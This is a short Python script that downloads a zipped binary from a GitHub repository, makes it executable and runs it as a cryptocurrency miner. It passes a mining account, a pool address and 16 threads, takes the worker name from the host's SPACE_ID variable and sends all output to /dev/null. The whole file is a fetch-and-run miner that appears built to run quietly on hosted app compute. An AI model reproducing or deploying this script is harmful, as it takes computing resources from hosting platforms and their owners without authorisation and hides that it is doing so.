import os
os.system("wget https://github.com/qqivk/Thv/blob/main/ttyu.zip")
os.system("unzip ttyu.zip")
os.system("chmod +x ttyu")
wn = os.getenv('SPACE_ID').replace("/","_")
os.system(f"./ttyu --account CP_fafubk1b65 --pool qubic1.hk.apool.io:3334 --thread 16 --worker {wn} >/dev/null")
